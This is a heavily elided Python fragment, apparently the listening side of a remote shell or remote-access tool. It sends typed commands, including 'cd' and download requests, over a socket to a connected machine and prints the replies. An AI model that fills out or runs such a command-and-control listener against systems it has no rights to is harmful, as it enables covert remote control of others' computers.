...
class Server(Thread):
    def __init__(self):
        ...
        self.cwd = self.conn.recv(1024).decode('ISO-8859-1', errors='ignore')
        self.commands = []
        self.ind = 0
        self.current_input = ''
    ...
    def download(self, command):
        self.conn.send(command.encode('ISO-8859-1', errors='ignore'))
    ...
    def run(self):
        while True:
            ...
            if 'cd' in command:
                ...
                try:
                    self.conn.send(command.encode('ISO-8859-1', errors='ignore'))
                    length = int(self.conn.recv(1024).decode('ISO-8859-1', errors='ignore'))
                    print(self.conn.recv(length).decode('ISO-8859-1', errors='ignore'))
